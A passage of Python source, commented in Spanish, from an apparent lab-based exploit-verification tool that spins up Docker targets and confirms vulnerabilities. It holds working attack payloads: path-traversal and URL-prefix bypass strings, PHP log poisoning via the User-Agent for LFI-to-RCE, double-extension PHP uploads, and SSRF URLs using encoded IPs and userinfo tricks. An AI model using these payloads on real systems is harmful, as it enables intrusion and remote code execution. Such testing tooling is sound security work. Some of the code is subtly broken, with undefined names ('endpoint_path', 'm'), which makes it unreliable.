        for cand_ep, cand_params, cand_meth, cand_up, from_scan in candidates:
            if from_scan:
                step(f"escaneo de fuente: probando ruta descubierta: {cand_ep} "
                     f"({'URL_PATH' if cand_up else 'query'})")
            cand_path_p = path_param_hint or _pick_param(cand_params, _PATH_HINTS) or ""
            tried: list = []
            for payload_value in attempts:
                try:
                    if cand_up:
                        # el payload va concatenado al path de la URL.
                        # url_suffix (opcional, e.g. '/cover' en audiobookshelf CVE-2026-71209)
                        # se añade DESPUES del payload: /items/{traversal}/cover
                        # query_suffix (opcional, e.g. 'import&' en CVE-2025-30208 Vite)
                        # se añade como query string: /@fs/{path}?import&
                        _qs = ("?" + query_suffix) if query_suffix and not query_suffix.startswith("?") else query_suffix
                        target_url = base_url + cand_ep + payload_value + url_suffix + _qs
                        # requests.request() normaliza %2e a '.' ANTES de enviar -- exactamente
                        # lo que rompe bypasses como '.%2e/' (CVE-2021-41773).
                        _has_pct_dot = "%2e" in payload_value.lower() or "%2f" in payload_value.lower()
                        if _has_pct_dot and cand_meth == "GET":
                            resp = _http_request_raw_path(cand_meth, target_url, timeout=15)
                        else:
                            resp = _http_request(cand_meth, target_url, timeout=15,
                                                 headers=custom_headers or None)
                        payload_desc = f"URL_PATH={payload_value!r}{('+' + url_suffix) if url_suffix else ''}{_qs or ''}"
                    else:
                        payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
                        payload[cand_path_p or path_param or "path"] = payload_value
                        resp = _http_request(cand_meth, base_url + cand_ep, timeout=15,
                                             data=payload if cand_meth != "GET" else None,
                                             params=payload if cand_meth == "GET" else None,
                                             headers=custom_headers or None)
                        payload_desc = f"{cand_path_p or path_param}={payload_value!r}"
                except Exception as e:
                    tried.append({"payload": payload_value, "error": str(e)})
                    continue
                present = secret in (resp.text or "")
                tried.append({"payload": payload_value, "status": resp.status_code,
                              "secreto_presente": present,
                              "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
                if present:
                    found = True
                    win_ep, win_up, win_pp = cand_ep, cand_up, cand_path_p
                    res.evidence["payload_ganador"] = payload_value
                    res.evidence["status_code_respuesta"] = resp.status_code
                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                    step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                         f"{payload_desc}.")
                    _shot_url = (base_url + cand_ep + payload_value) if cand_up else (base_url + cand_ep)
                    _add_exploit_evidence(
                        res=res, method=cand_meth, url=_shot_url,
                        resp_or_body=resp,
                        highlight=secret,
                        caption_es=(f"PATH TRAVERSAL confirmado: {canary_path} devuelto por "
                                    f"el servidor — secreto plantado visible en la respuesta."),
                        caption_en=(f"PATH TRAVERSAL confirmed: {canary_path} returned by "
                                    f"server — planted secret visible in response."),
                        extra_terminal=(f"Canary: {canary_path}\n"
                                        f"Secret: {secret}\n"
                                        f"Payload: {payload_value}\n"
                                        f"Response body:\n{(resp.text or '')[:400]}"),
                    )
                    step("captura HTTP guardada en el informe.")
                    break
            tried_all.extend(tried)
            if found:
                break

        # --- URL-prefix bypass strategy (Rack::Static / aiohttp static / similar) -----------
        # Si el path-traversal estandar (canario en /tmp/) no funciono Y estamos en modo
        # URL_PATH, intentamos el patron de "bypass del prefijo URL": la vulnerabilidad NO
        # escapa al sistema de ficheros fuera del root del servidor web, sino que permite acceder
        # a ficheros DENTRO del root que no deberian ser accesibles porque no estan bajo el
        # prefijo URL configurado (ej. GET /static/..%2fsecret.txt -> sirve root/secret.txt).
        # CVE-2025-27610 (Rack::Static) usa exactamente este patron.
        if not found and any(cand_up for _ep, _p, _m, cand_up, _fs in candidates):
            canary_name = f"binoracle_bypass_{_token()}.txt"
            # Rutas candidatas dentro del contenedor: comunes para servidores web con Docker
            root_cands = ["/app/public", "/app/www", "/app/static", "/app",
                          "/srv/public", "/srv/www", "/var/www/html", "/var/www/public",
                          "/usr/share/nginx/html", "/usr/share/nginx/www"]
            # Si el escaner extrajo RACK_STATIC_ROOT, priorizarlo
            for _ep2, _p2, _m2, _up2, _fs2 in candidates:
                if isinstance(_p2, dict):
                    _rsr = _p2.get("RACK_STATIC_ROOT", "")
                    if _rsr:
                        if not _rsr.startswith("WORKDIR/"):
                            root_cands = [_rsr] + root_cands
                        # "WORKDIR/" solo → se expande a WORKDIR puro después de detectar $PWD
            # Detectar WORKDIR del contenedor para expandir rutas relativas y priorizarlo
            try:
                _wd = lab.sh("exec", container, "sh", "-c", "echo $PWD").stdout.strip()
                if _wd and _wd != "/":
                    # Sustituir WORKDIR/ → "<wd>/" y "WORKDIR/" puro (trailing slash) → "<wd>"
                    def _sub_wd(rc: str) -> str:
                        s = rc.replace("WORKDIR/", _wd + "/")
                        return s.rstrip("/") if s != _wd + "/" else _wd
                    root_cands = [_sub_wd(rc) for rc in root_cands]
                    root_cands = [_wd + "/public", _wd + "/www", _wd + "/static", _wd] + root_cands
            except Exception:
                pass
            secret2 = _token() * 4
            for _root_cand in root_cands:
                _rc_path = f"{_root_cand}/{canary_name}"
                if not lab.write_canary(container, _rc_path, secret2):
                    continue
                # El prefijo URL es el endpoint de la ruta (ej. '/static/')
                # Payload: ..%2f<canary> (1 nivel arriba = sale del subdir del prefijo)
                for cand_ep, _cp, cand_meth, cand_up, _fs in candidates:
                    if not cand_up:
                        continue
                    bypass_payloads = [
                        f"..%2f{canary_name}", f"%2e%2e%2f{canary_name}",
                        f".%2e%2f{canary_name}", f"..%2F{canary_name}",
                        f"../{canary_name}",
                    ]
                    for bp in bypass_payloads:
                        try:
                            target_url = base_url + cand_ep + bp
                            resp = _http_request_raw_path(cand_meth, target_url, timeout=15)
                            present = secret2 in (resp.text or "")
                            tried_all.append({"payload": f"[bypass]{bp}", "root_cand": _root_cand,
                                             "status": resp.status_code, "secreto_presente": present,
                                             "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
                            if present:
                                found = True
                                win_ep, win_up = cand_ep, True
                                canary_path = _rc_path
                                secret = secret2
                                res.evidence["payload_ganador"] = bp
                                res.evidence["status_code_respuesta"] = resp.status_code
                                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                                res.evidence["bypass_root_candidate"] = _root_cand
                                step(f"VERIFICADO (prefix bypass): canario en {_rc_path} accesible "
                                     f"via URL_PATH={bp!r} -- el middleware sirve ficheros fuera "
                                     f"del prefijo URL configurado.")
                                _bp_url = target_url
                                _add_exploit_evidence(
                                    res=res, method="GET", url=_bp_url,
                                    resp_or_body=resp, highlight=secret2,
                                    caption_es=(f"Bypass de prefijo URL confirmado: "
                                                f"{_rc_path} accesible fuera del prefijo "
                                                f"configurado (secreto plantado visible)."),
                                    caption_en=(f"URL-prefix bypass confirmed: "
                                                f"{_rc_path} accessible outside the "
                                                f"configured prefix (planted secret visible)."),
                                    extra_terminal=(f"Path: {_rc_path}\nSecret: {secret2}\n"
                                                    f"URL: {_bp_url}\n"
                                                    f"Response:\n{(resp.text or '')[:300]}"),
                                )
                                step("captura HTTP guardada en el informe.")
                                break
                        except Exception as e:
                            tried_all.append({"payload": f"[bypass]{bp}", "error": str(e)})
                    if found:
                        break
                if found:
                    break
        # --------------------------------------------------------------------------------------

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
                             "metodo": (http_method or "GET").upper(), "path_param": win_pp,
                             "canary_path": canary_path, "canary_secret": secret})
        res.evidence["intentos"] = tried_all
        if found:
            res.verified = True
            res.ok = True
            winner = res.evidence["payload_ganador"]
            mode_desc = f"URL_PATH={winner!r}" if win_up else f"{win_pp}={winner!r}"
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {mode_desc} devolvio "
                          f"el secreto exacto plantado en {canary_path} (dentro del contenedor "
                          f"del objetivo)")
        else:
            res.ok = True
            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried_all
                          if t.get("respuesta_cuerpo_recorte")), "")
            res.evidence["respuesta_muestra_primer_intento"] = sample
            res.detail = (f"se probaron {len(tried_all)} variantes de ruta en {len(candidates)} "
                          f"candidato(s) y ninguna devolvio el secreto plantado -- el traversal "
                          f"no se confirmo (puede necesitar otra profundidad/codificacion, o el "
                          f"endpoint/parametro no son los reales)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_lfi_rce(
    source_dir: str, endpoint: str, http_method: str, parameters,
    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """LFI-a-RCE por envenenamiento de log (log poisoning), una tecnica MAS AVANZADA y distinta
    de path traversal (que solo LEE un fichero): si el parametro vulnerable se usa para un
    `include()`/`require()` de PHP (o equivalente en otros lenguajes que interpretan el fichero
    incluido como codigo) en vez de solo servirlo como texto plano, un log de acceso del propio
    servidor web (que registra el User-Agent de cada peticion, SIN sanearlo) se puede envenenar
    con codigo real y luego incluirlo con el mismo parametro -- confirmado por EJECUCION real
    (el resultado del codigo aparece en la respuesta), no por la simple presencia del payload
    reflejado (eso solo demostraria lectura, no inclusion-como-codigo).

    Mecanismo (casuistica real de LFI/RCE via log poisoning, PayloadsAllTheThings):
    1) una peticion normal con un User-Agent que lleva `<?php system('echo MARKER'); ?>` -- el
       servidor web (Apache/nginx) registra ese User-Agent TAL CUAL en su log de acceso, sin
       interpretarlo (solo lo guarda como texto).
    2) el parametro vulnerable intenta incluir varias rutas de log comunes (Apache/nginx, con y
       sin traversal) -- si el codigo SI se interpreta al incluirse, el resultado del `system()`
       (el marcador ejecutado, no el PHP crudo) aparece en la respuesta."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
        if _params_list:
            path_param = _params_list[0]
        else:
            res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
            res.limitations.append("la verificacion de LFI-a-RCE necesita saber que parametro "
                                   "lleva la ruta/fichero; afina 'parameters' o pasalo a mano "
                                   "(path_param_hint)")
            return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        marker = f"binoracle_lfi_rce_{_token()}"
        poison_ua = f"<?php system('echo {marker}'); ?>"
        step(f"envenenando el log de acceso del servidor con codigo PHP real en el "
             f"User-Agent (marcador {marker!r})...")
        try:
            _http_request("GET", base_url + "/", timeout=15,
                          headers={"User-Agent": poison_ua})
        except Exception as e:
            res.detail = f"la peticion de envenenamiento del log fallo: {e}"
            return res
        time.sleep(1)

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        # rutas de log mas comunes de Apache/nginx en imagenes oficiales de Docker, con y sin
        # profundidad de traversal (el mismo parametro puede ser vulnerable a traversal Y a LFI
        # a la vez, o solo aceptar la ruta absoluta sin mas).
        log_paths = [
            "/var/log/apache2/access.log", "/var/log/apache2/other_vhosts_access.log",
            "/var/log/httpd/access_log", "/var/log/nginx/access.log",
            "/usr/local/apache2/logs/access_log",
        ]
        depths = (0, 4, 8, 12)
        attempts = []
        for lp in log_paths:
            rel = lp.lstrip("/")
            for n in depths:
                attempts.append(("../" * n) + rel if n else lp)

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "path_param": path_param, "marcador": marker,
                             "user_agent_veneno": poison_ua})

        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[path_param] = payload_value
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            text = resp.text or ""
            # EJECUTADO (el resultado de system(), sin las etiquetas PHP alrededor) es la prueba
            # real -- el payload crudo reflejado (con '<?php' literal) solo demuestra LECTURA,
            # NUNCA se marca como RCE por eso solo.
            executed = marker in text and "<?php" not in text
            raw_reflected = marker in text and "<?php" in text
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "ejecutado": executed, "reflejado_crudo_sin_ejecutar": raw_reflected})
            if executed:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["respuesta_cuerpo_recorte"] = text[:500]
                step(f"VERIFICADO: el marcador '{marker}' aparecio EJECUTADO (no como texto PHP "
                     f"crudo) tras incluir el log envenenado con {path_param}="
                     f"{payload_value!r}.")
                break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"LFI-A-RCE confirmado (envenenamiento de log): la peticion con "
                          f"{path_param}={res.evidence['payload_ganador']!r} incluyo el log de "
                          f"acceso envenenado y el codigo PHP SE EJECUTO de verdad (el marcador "
                          f"'{marker}' aparecio como resultado de system(), no como texto PHP "
                          f"crudo) -- ejecucion remota de codigo real, no una lectura de fichero")
            _body = res.evidence.get("respuesta_cuerpo_recorte", "")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + endpoint_path,
                resp_or_body=_body, highlight=marker,
                caption_es=(f"LFI-a-RCE CONFIRMADO: log envenenado incluido y PHP ejecuto "
                            f"el payload — marcador '{marker}' presente en la respuesta."),
                caption_en=(f"LFI-to-RCE CONFIRMED: poisoned log included and PHP executed "
                            f"the payload — marker '{marker}' present in response."),
                extra_terminal=(f"Path param: {path_param}\n"
                                f"Payload: {res.evidence.get('payload_ganador','')}\n"
                                f"Marcador: {marker}\n"
                                f"Respuesta:\n{_body[:300]}"),
            )
        else:
            any_raw = any(t.get("reflejado_crudo_sin_ejecutar") for t in tried)
            res.ok = True
            res.detail = (f"se probaron {len(tried)} rutas de log comunes para {path_param} y "
                          f"ninguna ejecuto el marcador -- LFI-a-RCE no se confirmo" +
                          (" (el payload SI se reflejo crudo en al menos un intento, sugiriendo "
                           "LECTURA de fichero pero NO inclusion-como-codigo -- puede ser solo "
                           "path traversal, no LFI)" if any_raw else
                           " (ninguna ruta de log probada fue incluida; puede que el log real "
                           "este en otra ruta, o que el parametro no incluya ficheros como "
                           "codigo)"))
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_idor(
    source_dir: str, endpoint: str, http_method: str, parameters,
    id_param_hint: str = "", own_id: str = "1", victim_id: str = "2",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
) -> WpVerifyResult:
    """Version DELIBERADAMENTE MAS DEBIL del IDOR que verify_wordpress_account_takeover y
    similares confirman en WordPress/Drupal/Joomla: aqui NO hay ningun flujo de login generico
    (no hay forma de autenticar contra un stack arbitrario sin conocerlo), asi que esto no puede
    demostrar "un usuario sin permiso accede al recurso de otro" -- solo "pedir el mismo
    endpoint con dos IDs distintos, SIN SESION, devuelve contenido realmente distinto para cada
    uno (no solo un generico 403/404 igual para ambos)". Eso es una senal real de que el ID se
    usa para resolver un recurso concreto sin mas comprobacion visible desde fuera, pero es
    MUCHO mas floja que una confirmacion con dos cuentas reales -- `res.verified` nunca se pone
    a True aqui, solo `res.ok`, precisamente para no igualar ambos niveles de prueba en el
    informe. Pensado para CVEs IDOR en codigo que no es WordPress/Drupal/Joomla pero trae su
    propio Dockerfile/docker-compose.yml (ver _bootstrap_generic_lab)."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    if not id_param:
        res.detail = "no se identifico el parametro que lleva el ID del recurso"
        res.limitations.append("la verificacion de IDOR necesita saber que parametro lleva el "
                               "ID del recurso; afina 'parameters' o pasalo a mano "
                               "(id_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "id_param": id_param, "own_id": own_id,
                             "victim_id": victim_id})
        res.limitations.append(
            "esta verificacion generica NO usa ninguna sesion autenticada (no hay forma de "
            "iniciar sesion contra un stack arbitrario sin conocerlo de antemano) -- solo "
            "compara dos respuestas SIN login, nunca confirma que un usuario sin permiso "
            "accede al recurso de OTRO usuario concreto. Es una prueba REAL pero deliberadamente "
            "mas debil que la de WordPress/Drupal/Joomla (que SI usa dos cuentas reales); nunca "
            "se marca 'verificado' con esto, solo se deja constancia de la diferencia observada")

        def req(id_value):
            payload = dict(base_params)
            payload[id_param] = id_value
            return _http_request(m, base_url + endpoint, timeout=15,
                                 data=payload if m != "GET" else None,
                                 params=payload if m == "GET" else None)

        try:
            resp_own = req(own_id)
            resp_victim = req(victim_id)
        except Exception as e:
            res.detail = f"la peticion de comparacion fallo: {e}"
            return res

        own_text, victim_text = (resp_own.text or ""), (resp_victim.text or "")
        res.evidence["status_propio"] = resp_own.status_code
        res.evidence["status_victima"] = resp_victim.status_code
        res.evidence["respuesta_propia_recorte"] = own_text[:300]
        res.evidence["respuesta_victima_recorte"] = victim_text[:300]

        both_ok = resp_own.status_code < 400 and resp_victim.status_code < 400
        differs = own_text != victim_text and len(victim_text) > 20
        res.ok = True
        if both_ok and differs:
            res.evidence["diferencia_observada"] = True
            res.detail = (f"DIFERENCIA REAL observada (prueba mas debil, SIN sesion): "
                          f"{id_param}={own_id!r} y {id_param}={victim_id!r} devolvieron "
                          f"contenido DISTINTO, ambos con status < 400 -- indicio de que el ID "
                          f"resuelve un recurso concreto sin mas comprobacion visible desde "
                          f"fuera. Esto NO confirma el impacto real de un IDOR (eso exige dos "
                          f"cuentas reales con y sin permiso); solo que el servidor distingue "
                          f"entre IDs sin rechazar ninguno")
            step(f"diferencia real observada entre {id_param}={own_id!r} y {id_param}="
                 f"{victim_id!r} (prueba mas debil, sin sesion)")
            _idor_url = base_url + endpoint + (f"?{id_param}={victim_id}" if m == "GET" else "")
            _add_exploit_evidence(
                res=res, method=m, url=_idor_url, resp_or_body=resp_victim,
                highlight="",
                caption_es=(f"IDOR: {id_param}={victim_id!r} devuelve contenido distinto "
                            f"({resp_victim.status_code}) — diferencia de {abs(len(own_text)-len(victim_text))} bytes."),
                caption_en=(f"IDOR: {id_param}={victim_id!r} returns distinct content "
                            f"({resp_victim.status_code}) — {abs(len(own_text)-len(victim_text))} bytes difference."),
            )
        else:
            res.evidence["diferencia_observada"] = False
            res.detail = (f"{id_param}={own_id!r} (status {resp_own.status_code}) y "
                          f"{id_param}={victim_id!r} (status {resp_victim.status_code}) no "
                          f"mostraron una diferencia real -- el IDOR no se confirmo (puede "
                          f"necesitar otro endpoint/parametro, o ambos IDs estan igualmente "
                          f"bloqueados/permitidos)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_file_upload(
    source_dir: str, endpoint: str, file_param_hint: str = "", other_parameters=None,
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
) -> WpVerifyResult:
    """Sube un fichero BENIGNO con doble extension (p.ej. 'poc.php.jpg') y contenido PHP real
    que solo imprime un secreto aleatorio -- misma idea que verify_generic_command_injection:
    la confirmacion no depende de adivinar la URL publica donde queda servido (no hay forma
    generica de saberlo sin conocer el stack), sino de buscar DENTRO del contenedor real (via
    `docker exec grep`) un fichero que contenga el secreto exacto que se subio. Si aparece, el
    servidor acepto y guardo de verdad un fichero con una extension peligrosa y contenido
    ejecutable -- la vulnerabilidad real (subida sin restriccion), confirmada por su efecto en
    disco, no por un codigo de estado 200. No intenta confirmar EJECUCION del fichero (eso exige
    saber la URL publica real, que SI depende del stack) -- `res.verified` se basa solo en el
    almacenamiento confirmado, y el informe lo deja explicito para no sobre-interpretarlo como
    RCE."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = _token() * 4
        file_param = file_param_hint or _pick_param(other_parameters, _FILE_UPLOAD_HINTS) or "file"
        base_params = dict(other_parameters) if isinstance(other_parameters, dict) else {}
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "file_param": file_param, "canary_secret": secret})

        # dobles extensiones comunes (el servidor puede mirar solo la ULTIMA extension y
        # confundirla con un tipo inocuo, o solo la PRIMERA y servir el fichero igual por su
        # extension real) -- casuistica de Upload Insecure Files/Extension PHP en
        # PayloadsAllTheThings, sin intentar nada destructivo (el PHP solo imprime el secreto).
        php_payload = f"<?php echo '{secret}'; ?>"
        candidates = [
            ("poc.php.jpg", "image/jpeg"), ("poc.jpg.php", "application/octet-stream"),
            ("poc.php5.jpg", "image/jpeg"), ("poc.phtml", "image/jpeg"),
            ("poc.php", "image/jpeg"),
        ]

        tried = []
        found = False
        for fname, ctype in candidates:
            payload = dict(base_params)
            files = {file_param: (fname, php_payload, ctype)}
            try:
                _http_request("POST", base_url + endpoint, timeout=15, data=payload, files=files)
            except Exception as e:
                tried.append({"fichero": fname, "error": str(e)})
                continue
            time.sleep(1)
            r = lab.sh("exec", container, "sh", "-c",
                      f"grep -rl {secret} / 2>/dev/null | grep -v '^/proc' | head -3",
                      timeout=20)
            matches = [p for p in (r.stdout or "").splitlines() if p.strip()]
            tried.append({"fichero": fname, "content_type": ctype, "rutas_encontradas": matches})
            if matches:
                found = True
                res.evidence["fichero_ganador"] = fname
                res.evidence["ruta_real_en_el_contenedor"] = matches[0]
                step(f"VERIFICADO: el fichero subido ('{fname}') aparecio de verdad dentro del "
                     f"contenedor en {matches[0]}, con el secreto exacto -- el servidor acepto y "
                     f"guardo un fichero con extension/contenido peligroso.")
                break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SUBIDA SIN RESTRICCION confirmada: el fichero '{res.evidence['fichero_ganador']}' "
                          f"quedo guardado de verdad en {res.evidence['ruta_real_en_el_contenedor']} "
                          f"dentro del contenedor, con el secreto exacto que se subio -- prueba "
                          f"real del almacenamiento, no una deduccion por status code. Esto NO "
                          f"confirma ejecucion remota de codigo (eso exige conocer la URL publica "
                          f"real del fichero, que depende del stack); solo que la subida con "
                          f"extension/contenido peligroso fue aceptada y persistida")
            res.limitations.append(
                "verificado el ALMACENAMIENTO del fichero peligroso, no su EJECUCION -- para "
                "confirmar RCE real hace falta encontrar la URL publica donde el servidor lo "
                "sirve (especifico del stack) y comprobar que el secreto aparece al pedirla")
            _file_body = (f"fichero '{res.evidence['fichero_ganador']}' guardado en\n"
                          f"{res.evidence['ruta_real_en_el_contenedor']}\n"
                          f"(verificado con secreto canario dentro del contenedor)")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + endpoint,
                resp_or_body=_file_body,
                highlight=res.evidence.get("fichero_ganador", ""),
                caption_es=(f"FILE UPLOAD CONFIRMADO: '{res.evidence.get('fichero_ganador','')}' "
                            f"guardado en {res.evidence.get('ruta_real_en_el_contenedor','')} "
                            f"con el secreto canario."),
                caption_en=(f"FILE UPLOAD CONFIRMED: '{res.evidence.get('fichero_ganador','')}' "
                            f"stored at {res.evidence.get('ruta_real_en_el_contenedor','')} "
                            f"with canary secret."),
                extra_terminal=_file_body,
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} nombres/extensiones de fichero contra "
                          f"{endpoint} ('{file_param}') y ninguno aparecio dentro del contenedor "
                          f"-- no se confirmo subida sin restriccion (puede que el endpoint/"
                          f"parametro no sean los reales, o que el servidor rechace de verdad "
                          f"estas extensiones)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_ssrf(
    source_dir: str, endpoint: str, http_method: str, parameters,
    url_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_ssrf: levanta un contenedor 'callback' en la MISMA
    red del laboratorio generico (sea `dockerfile` o `compose` -- ver _GenericLab.resolve_network)
    y prueba las mismas variantes de URL/codificacion para confirmar que el SERVIDOR del objetivo
    (no el navegador del atacante) hace de verdad la peticion saliente."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
    if not url_param:
        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
                               "URL remota; afina 'parameters' o pasalo a mano (url_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
        listener = lab.start_listener()
        if not listener:
            res.detail = "no se pudo levantar el contenedor listener para SSRF"
            return res

        listener_ip = lab.container_ip(lab.listener)
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        found = False
        tried = []

        def build_urls(tok: str) -> List[str]:
            path = f"binoracle-ssrf-{tok}"
            urls = [f"http://{lab.listener}:8080/{path}"]
            if listener_ip:
                parts = [int(x) for x in listener_ip.split(".")]
                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                octip = "0" + ".".join(f"{x:03o}" for x in parts)
                urls += [
                    f"http://{listener_ip}:8080/{path}",
                    f"http://{dec}:8080/{path}",
                    f"http://{hexip}:8080/{path}",
                    f"http://{octip}:8080/{path}",
                    f"http://trusted-host@{listener_ip}:8080/{path}",
                    f"http://{listener_ip}:8080@evil.invalid/{path}",
                    f"http://{lab.listener}.:8080/{path}",
                ]
            return urls

        first_resp_captured = False
        for attempt_url in build_urls(_token()):
            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[url_param] = attempt_url
            entry = {"url": attempt_url, "token": token}
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None,
                                        headers=custom_headers or None)
                entry["status"] = resp.status_code
                if not first_resp_captured:
                    res.evidence["respuesta_cuerpo_recorte"] = (getattr(resp, "text", "") or "")[:500]
                    first_resp_captured = True
            except Exception as e:
                entry["peticion_error"] = str(e)
            time.sleep(2)
            log = lab.listener_log()
            entry["token_en_log"] = token in log
            tried.append(entry)
            if token in log:
                found = True
                res.evidence["callback_url_ganadora"] = attempt_url
                res.evidence["token_ganador"] = token
                res.evidence["listener_log_recorte"] = log[:1000]
                break

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "url_param": url_param, "listener_ip": listener_ip,
                             "metodo": m, "intentos": tried})

        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
                          f"laboratorio) recibio una conexion con el token exacto tras la "
                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                          f"navegador del atacante")
            step(f"VERIFICADO: el listener interno recibio el token "
                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
            _ssrf_url = base_url + endpoint
            _ssrf_body = f"Token SSRF recibido:\n{res.evidence.get('token_ganador','')}\n\nLog del listener:\n{res.evidence.get('listener_log_recorte','')[:600]}"
            _add_exploit_evidence(
                res=res, method=m, url=_ssrf_url,
                resp_or_body=_ssrf_body,
                highlight=res.evidence.get("token_ganador", ""),
                caption_es=(f"SSRF confirmado: listener interno recibio el token "
                            f"'{res.evidence.get('token_ganador','')}' al enviar "
                            f"{url_param}={res.evidence.get('callback_url_ganadora','')!r}"),
                caption_en=(f"SSRF confirmed: internal listener received token "
                            f"'{res.evidence.get('token_ganador','')}' via "
                            f"{url_param}={res.evidence.get('callback_url_ganadora','')!r}"),
                extra_terminal=_ssrf_body,
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
                          f"que el endpoint/parametro no sean los reales, o que el servidor "
